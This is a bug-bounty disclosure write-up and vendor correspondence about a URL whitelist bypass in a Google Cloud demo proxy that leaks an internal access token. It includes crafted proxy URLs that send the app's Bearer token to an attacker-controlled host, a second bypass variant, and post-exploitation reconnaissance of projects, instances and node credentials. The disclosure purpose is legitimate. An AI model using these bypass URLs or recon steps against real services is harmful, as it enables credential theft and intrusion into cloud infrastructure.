title: "URL whitelist bypass in https://cxl-services.appspot.com"
---

**Summary:**

Access Token for internal GCP project "cxl-services" (with scopes `"https://www.googleapis.com/auth/dispatcher`, `https://www.googleapis.com/auth/jobs` and `https://www.googleapis.com/auth/cloud-platform"`) can be leaked using a URL whitelist bypass on `https://cxl-services.appspot.com/proxy`. This token could be used to elevate privileges in other internal projects, access some internal Compute instances and possibly take full control over `cxl-services.appspot.com`.  This App Engine app proxies demo API requests on Google Cloud product pages (e.g. Cloud Text-to-Speech Demo).

**Core Issue:**

The domain whitelist check on `cxl-services.appspot.com` can be bypassed with the `\@` trick. It is probably using the vulnerable regex from [https://tools.ietf.org/html/rfc3986#appendix-B](https://tools.ietf.org/html/rfc3986#appendix-B).

When validating the URL `https://[your_domain]\@jobs.googleapis.com`, the regex thinks that the authority is `jobs.googleapis.com`, but the library making the request actually parses `[your_domain]` as the authority, and `/@jobs.googleapis.com` as the path.

**Steps to Reproduce:**

*If you already have an HTTPS server where you can view request headers, skip to `Step 5.`.* \
*You can probably use plain HTTP and `netcat`, but then the access token would be transported unencryped.*

1. Set up a VPS, and point a domain to it
2. Generate an SSL certificate with LetsEncrypt
3. Download my [`httpsserver.py` Python script](https://gist.github.com/xdavidhu/9491a9918b4dfbaffb789a8b9f2d1672), and fill out the `hostname` variable on `line 5`
4. Create an empty directory, `cd` into it, and start the server with `sudo /path/to/httpsserver.py --verbose`
5. With a browser, open the URL `https://cxl-services.appspot.com/proxy?url=https://[your_domain]\@jobs.googleapis.com/`
6. On your VPS, see that the `cxl-services.appspot.com` App Engine app has sent a request with the header `authorization: Bearer [access-token]`

**Post-Exploitation:**

I've sent some (in my viewpoint, harmless) read-only requests with the access-token to prove impact, here is what I found:

This access token has (some) access to these GCP projects:
- `docai-demo`
- `cxl-services`
- `garage-staging`
- `p-jobs`

Based on some other API requests I made, it feels like the token has "full" access to `docai-demo` and `cxl-services`, and limited access on `garage-staging` and `p-jobs`.

On the project `docai-demo` I have found 2 GCE instances:
- `gke-cluster-1-default-pool-af71d616-j454` (`35.193.88.22`)
- `gke-cluster-1-default-pool-af71d616-stj9` (`35.223.244.119`)

Both of these instances have the metadata entry with key `kube-env` witch exposes (to my limited Kubernetes knowledge) all of the node's credentials: `KUBELET_CERT`, `KUBELET_KEY` and `CA_CERT`.

The project `cxl-services` is hosting the App Engine app `https://cxl-services.appspot.com/`, which proxies demo API requests on the Google Cloud product pages. It feels like this access token has **full access to this App Engine app**, but I wasn't able to prove any impact here, since the API `appengine.googleapis.com` is not enabled on the `cxl-services` project, and I didn't want to enable it.

I also saw some enabled `staging` or `autopush` APIs, so some non-public APIs/versions might be available using these projects.

Interestingly enough, I wasn't able to hit the Metadata API using this domain bypass. Every attempt resulted in `500 Internal Server Error`. But it looks like this access token has the same privileges as the service account I could have stolen from the Metadata API.

**Documentation of my actions:**

During testing I might have made `cxl-services.appspot.com` send HTTP / HTTPS requests (with the access token) to these domains *not* under my control:
- `xip.io` (for `169.254.169.254.xip.io`)
- `screenshot.googleplex.com`
- `xdavidhu.me` (GitHub Pages)
- `jobs.go` (unexistent domain)
- `169.254.169.253`,`169.254.169.254`,`metadata`,`metadata.google.internal` (for metadata testing without success)
- `jobs.googleapis.com`, `texttospeech.googleapis.com`

I have called these API methods with the access tokens obtained:
- `https://oauth2.googleapis.com/tokeninfo`
- `https://cloudresourcemanager.googleapis.com/v1/projects`
- `https://appengine.googleapis.com/v1/apps/[project]/services` (`cxl-services`)
- `https://compute.googleapis.com/compute/v1/projects/[project]/aggregated/instances` (`garage-staging`, `cxl-services`, `docai-demo`)
- `https://servicemanagement.googleapis.com/v1/services?consumerId=project:[project]` (`cxl-services`, `p-jobs`, `garage-staging`, `docai-demo`)
- `https://cloudconsole-pa.clients6.google.com/v2/entity/APP_ENGINE_VERSIONS_LIST` (`cxl-services`)

**Impact:**

An anonymous attacker could exploit the URL validation vulnerability, and steal the access token the `cxl-services.appspot.com` App Engine app is sending.

Using this access token, the attacker could access resources on GCP projects `docai-demo`, `cxl-services`,`garage-staging` and `p-jobs`.

Some attacks I think could be performed by an attacker:

- Take over the App Engine app `https://cxl-services.appspot.com/`, and steal the contents of all demo API requests and/or return malicious content to the users trying out the demos on the Cloud product pages.
- Take over the GKE cluster used by `docai-demo`, (which is probably running the demo on `https://cloud.google.com/document-ai`) and  steal the contents of all demo API requests and/or return malicious content. This falls under the first attack's impact, since this demo is also proxied by `cxl-services.appspot.com`.
- Try escalate privileges and maybe gain access to more internal Google Cloud resources.

Hi,

**I was able to demonstrate full access to the `cxl-services.appspot.com` GAE app** by deploying a `vrp-poc` service: [https://vrp-poc-dot-cxl-services.appspot.com/](https://vrp-poc-dot-cxl-services.appspot.com/)

I found some other sensitive things on project `cxl-services`:
- The bucket `cxl-services.appspot.com` **has hourly `appengine.googleapis.com/request_log` files** since `2017-10-18` up until today. These might contain sensitive user data.
- The bucket `staging.cxl-services.appspot.com` *(was, now I uploaded the 3 POC files)* empty, so the source files were not available. (The `get-version` AppEngine API call listed all filenames, like `google3/cloud/ux/services/services/proxy.py`) **But**, the `us.artifacts.cxl-services.appspot.com` bucket had some images, from which **the source code could be extracted**.

The requests I have made with the obtained access tokens:

Hi David,

Thanks for the report, nice! great that you are not downloading files with potential PII, could you please confirm that you didn't download them? If it was by mistake during testing please let us know which files, thanks!

Regards,
[redacted], Google Security Team

---

**Me - 2021-03-29 09:12**

Hi,

I only sent the requests documented above.

The files which could contain user-information I think (from my testing) are only the logs in `cxl-services.appspot.com`. I didn't download any of those objects, I just listed the contents of the bucket. (multiple times, even with a prefix to see if there are logs from 2021.)

Thank you,
David

**Me - 2021-03-29 09:22**

Hi,

There are still 3 projects for this access token that I didn't really look into: `docai-demo` `garage-staging` `p-jobs`

Can I play with these, or should I stop testing for now?

Thank you, \
David

Hi,

Just a heads-up, this issue will be disclosed in 20 days, on `2021-06-21`.

I might make a video about this using screen recordings of finding the bug. These recordings include some internal information. Should I redact any particular details?

Also, my POC is still up and running: [https://vrp-poc-dot-cxl-services.appspot.com/](https://vrp-poc-dot-cxl-services.appspot.com/)

Thank you, \
David

**Vendor - 2021-06-01 12:24**

Hi,

Thanks for the heads up about the disclosure of your report.

Please read [our stance on coordinated disclosure](https://security.googleblog.com/2010/07/rebooting-responsible-disclosure-focus.html). In essence, **our pledge to you is to respond promptly and fix vulnerabilities in a sensible timeframe** - and in exchange, **we ask for a reasonable advance notice**. 

Some things to note:

1. We might decide not to file a bug, or not to issue a VRP reward. Even if this is the case, please still coordinate your disclosure with us. Many of the reports we receive don't describe vulnerabilities with an impact that qualifies for a reward, but we still want to make sure we are prepared for your vulnerability disclosure.
2. We usually decide and pay the rewards before the vulnerability is fixed. The reward is not a payment for your silence, but we really want to have a chance to fix it on time for your disclosure, so please keep us up to date with the disclosure timeline, so we can update the engineering team of your plans.
3. If you gave us enough time to fix the described issue (you can read https://www.google.com/about/appsecurity/ for inspiration), and we are anyway unable to fix it before your disclosure date, we'll try to let you know in time (the disclosure date would still be your own decision).

At the end, **the decision on what to disclose and when is yours**, and we would be happy to forward any blog posts, slides, or paper drafts you might have to our teams internally (we might even provide you feedback). Thanks again for your help.

PS. If you give a talk, or make a blog post, or similar about this bug, please send us a link, we would love to read it, we might even tweet it from [our Twitter account](https://twitter.com/GoogleVRP).

Hi,

So before starting to work on the writeup, I wanted to test the fix. It indeed fixed the original trick of using `https://[your_domain]\@jobs.googleapis.com`.

But playing around a bit, I have found a way to once again bypass the URL whitelist: \
`https://cxl-services.appspot.com/proxy?url=https://sfmnev.vps.xdavidhu.me\_@jobs.googleapis.com/`

Opening this URL sends a request to my server with an access token.

Actually, it is not specific to the `_` character. Putting anything between the `\` and the `@` bypasses the whitelist, for example: \
`https://cxl-services.appspot.com/proxy?url=https://sfmnev.vps.xdavidhu.me\anything@jobs.googleapis.com/`

Thank you, \
David

**Me - 2021-06-17 09:36**

Hi,

Will a fix roll out until `2021-06-21`? \
If a fix will be deployed, but not until the deadline, I can delay the disclosure 14 days, with a new date of `2021-07-05`.

Let me know if I should delay the disclosure, of if a fix is coming.

Thank you, \
David

**Vendor - 2021-06-18 11:38**

Heya David,

So this one has been marked fixed by the product team, but its pending verification that the fix is accurate on our side.
Ostensibly the fix is live now. (just unverified/checked by us)

You'll get a notification when we've done the verification, but in the above context, I think the answer is the fix is deployed :D

cheers

**Me - 2021-06-18 12:13**

Hi,

I meant the fix for the bypass I found in comment #13. Did the product team fix that as well?

Thank you, \
David

---

**Vendor - 2021-06-22 18:07**

Hey,

Looks like the team did not know about that bypass. I reopened the bug and the team says it should be fixed now. Thanks!
